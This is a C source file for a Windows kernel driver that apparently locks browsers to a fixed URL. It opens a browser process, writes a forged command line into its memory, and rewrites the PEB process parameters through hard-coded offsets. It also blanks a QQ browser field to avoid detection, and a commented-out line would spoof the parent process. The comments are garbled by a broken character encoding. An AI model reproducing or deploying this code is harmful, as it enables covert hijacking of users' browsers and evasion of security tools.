
#include <ntifs.h>

#include "LockCommandLine.h"
#include "ToolFunction.h"
#include "IoControl.h"

typedef unsigned short WORD;
typedef struct _CURDIR
{
	UNICODE_STRING DosPath;
	PVOID Handle;
} CURDIR, *PCURDIR;

typedef struct _RTL_DRIVE_LETTER_CURDIR
{
	WORD Flags;
	WORD Length;
	ULONG TimeStamp;
	STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;

typedef struct _RTL_USER_PROCESS_PARAMETERS
{
	ULONG MaximumLength;
	ULONG Length;
	ULONG Flags;
	ULONG DebugFlags;
	PVOID ConsoleHandle;
	ULONG ConsoleFlags;
	PVOID StandardInput;
	PVOID StandardOutput;
	PVOID StandardError;
	CURDIR CurrentDirectory;
	UNICODE_STRING DllPath;
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
	PVOID Environment;
	ULONG StartingX;
	ULONG StartingY;
	ULONG CountX;
	ULONG CountY;
	ULONG CountCharsX;
	ULONG CountCharsY;
	ULONG FillAttribute;
	ULONG WindowFlags;
	ULONG ShowWindowFlags;
	UNICODE_STRING WindowTitle;
	UNICODE_STRING DesktopInfo;
	UNICODE_STRING ShellInfo;
	UNICODE_STRING RuntimeData;
	RTL_DRIVE_LETTER_CURDIR CurrentDirectores[32];
	ULONG EnvironmentSize;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;


extern WCHAR g_LockedURL[MAX_URL_LENGTH];
extern EBrowserType g_CurrentBrowser;

NTSTATUS LhpLockCommandLine(HANDLE ProcessId, LPWSTR ProcessImageName)
{
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	ESystemVersion SystemVersion = e_Windows_NotSupport;

	LhpGetSystemVersion(&SystemVersion);
	if (SystemVersion == e_Windows_XP)
	{
		Status = LhpLockCommandLineInternalXP(ProcessId, ProcessImageName);
	}
	else if (SystemVersion == e_Windows_7)
	{
		Status = LhpLockCommandLineInternaWin7(ProcessId, ProcessImageName);
	}

	return Status;
}

//
// �滻PEB-->RTL_USER_PROCESS_PARAMETERS�е�CommandLine����
//
NTSTATUS LhpLockCommandLineInternalXP(HANDLE ProcessId, LPWSTR ProcessImageName)
{
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	CLIENT_ID ClientId;
	OBJECT_ATTRIBUTES ObjectAttributes;
	PVOID NewCommandLineAddress = NULL;
	SIZE_T NewCommandLineLength = 0x1000;
	WCHAR NewCommandLineBuffer[MAX_PATH] = {0};
	HANDLE hProcess = NULL;
	PEPROCESS Process = NULL;

	do 
	{
		//
		// 1.�򿪽��̣���þ��
		//
		InitializeObjectAttributes(&ObjectAttributes, NULL, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
		ClientId.UniqueProcess = ProcessId;
		ClientId.UniqueThread = 0;

		Status = ZwOpenProcess(&hProcess, SYNCHRONIZE | STANDARD_RIGHTS_REQUIRED | SPECIFIC_RIGHTS_ALL, &ObjectAttributes, &ClientId);
		if (!NT_SUCCESS(Status))
			break;


		//
		// 2.�����û�̬�ڴ棬���������в���
		//
		Status = ZwAllocateVirtualMemory(hProcess, &NewCommandLineAddress, (ULONG_PTR)NULL, &NewCommandLineLength, MEM_COMMIT, PAGE_READWRITE);
		if (!NT_SUCCESS(Status))
			break;

		RtlStringCbCopyW(NewCommandLineBuffer, sizeof(NewCommandLineBuffer), L"\"");
		RtlStringCbCatW(NewCommandLineBuffer, sizeof(NewCommandLineBuffer), ProcessImageName);
		if (g_CurrentBrowser == e_Browser_Firefox){
			RtlStringCbCatW(NewCommandLineBuffer, sizeof(NewCommandLineBuffer), L"\" -osint -url \"");
		}else if (g_CurrentBrowser == e_Browser_QQ || g_CurrentBrowser == e_Browser_2345 || g_CurrentBrowser == e_Browser_UC){
			RtlStringCbCatW(NewCommandLineBuffer, sizeof(NewCommandLineBuffer), L"\" -- \"");
		}else{
			RtlStringCbCatW(NewCommandLineBuffer, sizeof(NewCommandLineBuffer), L"\" \"");
		}
		RtlStringCbCatW(NewCommandLineBuffer, sizeof(NewCommandLineBuffer), g_LockedURL);
		RtlStringCbCatW(NewCommandLineBuffer, sizeof(NewCommandLineBuffer), L"\"");

		Status = PsLookupProcessByProcessId(ProcessId, &Process);
		if (!NT_SUCCESS(Status))
			break;


		//
		// !!!���ص���������̵�ַ�ռ�!!!
		//
		KeAttachProcess(Process);

		RtlStringCbCopyW(NewCommandLineAddress, NewCommandLineLength, NewCommandLineBuffer);


		//
		// 3.�޸�EPROCESS-->PEB-->RTL_USER_PROCSS_PARAMETER-->CommandLine����
		//
		__try
		{
			PPEB Peb = NULL;
			PRTL_USER_PROCESS_PARAMETERS RtlUserProcessParameter = NULL;
			PUNICODE_STRING CommandLine = NULL;

			Peb = *(PVOID*)((PUCHAR)Process + 0x1B0);
			RtlUserProcessParameter = *(PVOID*)((PUCHAR)Peb + 0x10);
			CommandLine = (PUNICODE_STRING)((PUCHAR)RtlUserProcessParameter + 0x40);

			//
			// ������Ҫ��дƫ�Ƶ�ַ��֮��ntdll!RtlNormalizeProcessParams�����ƫ��������д��ֵ
			// ����ֱ����д��ַ: 
			//
			CommandLine->Buffer = (PWSTR)((PUCHAR)NewCommandLineAddress - (PUCHAR)RtlUserProcessParameter);
			CommandLine->Length = wcslen(NewCommandLineBuffer) * sizeof(WCHAR);
			CommandLine->MaximumLength = (USHORT)NewCommandLineLength;

			
			if (g_CurrentBrowser == e_Browser_QQ)
			{
				//
				// ����QB�����WindowTitle�ֶΣ���ֹʶ�����shell����
				//
				PWSTR szWindowTitle = (PWSTR)((PUCHAR)RtlUserProcessParameter + (ULONG)(RtlUserProcessParameter->WindowTitle.Buffer));
				szWindowTitle[0] = L'\0';
			}
		}
		__except(EXCEPTION_EXECUTE_HANDLER)
		{
			Status = STATUS_UNSUCCESSFUL;
		}

		//
		// !!!�����ҿ�!!!
		//
		KeDetachProcess();

	} while (FALSE);

	if (hProcess)
	{
		ZwClose(hProcess);
		hProcess = NULL;
	}

	if (Process)
	{
		ObDereferenceObject(Process);
		Process = NULL;
	}

	return Status;
}

//
// �滻PEB-->RTL_USER_PROCESS_PARAMETERS�������
//
NTSTATUS LhpLockCommandLineInternaWin7(HANDLE ProcessId, LPWSTR ProcessImageName)
{
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	CLIENT_ID ClientId;
	OBJECT_ATTRIBUTES ObjectAttributes;
	PRTL_USER_PROCESS_PARAMETERS NewProcessParameters = NULL;
	SIZE_T NewProcessParametersLength = 0x1000;
	WCHAR NewCommandLineBuffer[MAX_PATH] = {0};
	HANDLE hProcess = NULL;
	PEPROCESS Process = NULL;

	do 
	{
		//
		// 1.�򿪽��̣���þ��
		//
		InitializeObjectAttributes(&ObjectAttributes, NULL, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
		ClientId.UniqueProcess = ProcessId;
		ClientId.UniqueThread = 0;

		Status = ZwOpenProcess(&hProcess, SYNCHRONIZE | STANDARD_RIGHTS_REQUIRED | SPECIFIC_RIGHTS_ALL, &ObjectAttributes, &ClientId);
		if (!NT_SUCCESS(Status))
			break;


		//
		// 2.�����û�̬�ڴ棬���������в���
		//
		Status = ZwAllocateVirtualMemory(hProcess, &NewProcessParameters, (ULONG_PTR)NULL, &NewProcessParametersLength, MEM_COMMIT, PAGE_READWRITE);
		if (!NT_SUCCESS(Status))
			break;

		RtlStringCbCopyW(NewCommandLineBuffer, sizeof(NewCommandLineBuffer), L"\"");
		RtlStringCbCatW(NewCommandLineBuffer, sizeof(NewCommandLineBuffer), ProcessImageName);
		if (g_CurrentBrowser == e_Browser_Firefox){
			RtlStringCbCatW(NewCommandLineBuffer, sizeof(NewCommandLineBuffer), L"\" -osint -url \"");
		}else if (g_CurrentBrowser == e_Browser_QQ || g_CurrentBrowser == e_Browser_2345 || g_CurrentBrowser == e_Browser_UC){
			RtlStringCbCatW(NewCommandLineBuffer, sizeof(NewCommandLineBuffer), L"\" -- \"");
		}else{
			RtlStringCbCatW(NewCommandLineBuffer, sizeof(NewCommandLineBuffer), L"\" \"");
		}
		RtlStringCbCatW(NewCommandLineBuffer, sizeof(NewCommandLineBuffer), g_LockedURL);
		RtlStringCbCatW(NewCommandLineBuffer, sizeof(NewCommandLineBuffer), L"\"");

		//
		// !!!���ص���������̵�ַ�ռ�!!!
		//
		Status = PsLookupProcessByProcessId(ProcessId, &Process);
		if (!NT_SUCCESS(Status))
			break;

		KeAttachProcess(Process);


		__try
		{
			PPEB Peb = NULL;
			PRTL_USER_PROCESS_PARAMETERS RtlUserProcessParameter = NULL;
			int NewCommandLen = 0;
			int CommandLineIncrementSize = 0;
			int CommandLineOffset = 0;

			//
			// 3.�滻EPROCESS-->PEB-->RTL_USER_PROCSS_PARAMETER
			//

			Peb = *(PVOID*)((PUCHAR)Process + 0x1A8);
			RtlUserProcessParameter = *(PVOID*)((PUCHAR)Peb + 0x10);


			//
			// �滻EPROCESS->InheritedFromUniqueProcessId����ƭ������
			//
			//*(HANDLE*)((PUCHAR)Process + 0x140) = (HANDLE)4000;



			//
			// (1)����RTL_USER_PROCESS_PARAMETERS�ͺ���������CommandLineǰ�沿��
			//
			CommandLineOffset = (ULONG)((PUCHAR)RtlUserProcessParameter->CommandLine.Buffer - (PUCHAR)RtlUserProcessParameter);
			RtlZeroMemory(NewProcessParameters, NewProcessParametersLength);
			RtlCopyMemory(NewProcessParameters, RtlUserProcessParameter, CommandLineOffset);


			//
			// (2)�����µ������У���L'\0'��β
			//
			NewCommandLen = (wcslen(NewCommandLineBuffer) + 1)*sizeof(WCHAR);
			CommandLineIncrementSize = NewCommandLen - RtlUserProcessParameter->CommandLine.MaximumLength;
			RtlCopyMemory((PUCHAR)NewProcessParameters + CommandLineOffset, 
				NewCommandLineBuffer, 
				NewCommandLen
				);

			//
			// (3)���������к��������
			//
			RtlCopyMemory((PUCHAR)NewProcessParameters + CommandLineOffset + NewCommandLen,
				(PUCHAR)(RtlUserProcessParameter->CommandLine.Buffer) + RtlUserProcessParameter->CommandLine.MaximumLength,
				RtlUserProcessParameter->Length - ((ULONG)((PUCHAR)(RtlUserProcessParameter->CommandLine.Buffer) + RtlUserProcessParameter->CommandLine.MaximumLength - (PUCHAR)RtlUserProcessParameter))
				);

			//
			// (4)�޸������м�����沿�ֲ����ĵ�ַ
			//
			NewProcessParameters->MaximumLength = RtlUserProcessParameter->MaximumLength + CommandLineIncrementSize;
			NewProcessParameters->Length = RtlUserProcessParameter->Length + CommandLineIncrementSize;
			(PUCHAR)(NewProcessParameters->CommandLine.Buffer) += ((PUCHAR)NewProcessParameters - (PUCHAR)RtlUserProcessParameter);
			NewProcessParameters->CommandLine.Length = NewCommandLen - 2;
			NewProcessParameters->CommandLine.MaximumLength = (USHORT)NewCommandLen;

			if (RtlUserProcessParameter->CurrentDirectory.DosPath.Buffer)
			{
				(PUCHAR)(NewProcessParameters->CurrentDirectory.DosPath.Buffer) += ((PUCHAR)NewProcessParameters - (PUCHAR)RtlUserProcessParameter);
			}

			if (RtlUserProcessParameter->DllPath.Buffer)
			{
				(PUCHAR)(NewProcessParameters->DllPath.Buffer) += ((PUCHAR)NewProcessParameters - (PUCHAR)RtlUserProcessParameter);
			}

			if (RtlUserProcessParameter->ImagePathName.Buffer)
			{
				(PUCHAR)(NewProcessParameters->ImagePathName.Buffer) += ((PUCHAR)NewProcessParameters - (PUCHAR)RtlUserProcessParameter);
			}

			//
			// ����Ľ�����ƫ������
			//
			if (RtlUserProcessParameter->WindowTitle.Buffer)
			{
				(PUCHAR)(NewProcessParameters->WindowTitle.Buffer) += ((PUCHAR)NewProcessParameters - (PUCHAR)RtlUserProcessParameter);
				(PUCHAR)(NewProcessParameters->WindowTitle.Buffer) += CommandLineIncrementSize;

				if (g_CurrentBrowser == e_Browser_QQ)
				{
					//
					// ����QB�����WindowTitle�ֶΣ���ֹʶ�����shell����
					//
					NewProcessParameters->WindowTitle.Buffer[0] = L'\0';
				}
			}
			
			if (RtlUserProcessParameter->DesktopInfo.Buffer)
			{
				(PUCHAR)(NewProcessParameters->DesktopInfo.Buffer) += ((PUCHAR)NewProcessParameters - (PUCHAR)RtlUserProcessParameter);
				(PUCHAR)(NewProcessParameters->DesktopInfo.Buffer) += CommandLineIncrementSize;
			}

			if (RtlUserProcessParameter->ShellInfo.Buffer)
			{
				(PUCHAR)(NewProcessParameters->ShellInfo.Buffer) += ((PUCHAR)NewProcessParameters - (PUCHAR)RtlUserProcessParameter);
				(PUCHAR)(NewProcessParameters->ShellInfo.Buffer) += CommandLineIncrementSize;
			}

			if (RtlUserProcessParameter->RuntimeData.Buffer)
			{
				(PUCHAR)(NewProcessParameters->RuntimeData.Buffer) += ((PUCHAR)NewProcessParameters - (PUCHAR)RtlUserProcessParameter);
				(PUCHAR)(NewProcessParameters->RuntimeData.Buffer) += CommandLineIncrementSize;
			}


			//
			// (5)�滻
			//
			*(PRTL_USER_PROCESS_PARAMETERS*)((PUCHAR)Peb + 0x10) = NewProcessParameters;

		}
		__except(EXCEPTION_EXECUTE_HANDLER)
		{
			Status = STATUS_UNSUCCESSFUL;
		}

		//
		// !!!�����ҿ�!!!
		//
		KeDetachProcess();

	} while (FALSE);

	if (hProcess)
	{
		ZwClose(hProcess);
		hProcess = NULL;
	}

	if (Process)
	{
		ObDereferenceObject(Process);
		Process = NULL;
	}

	return Status;
}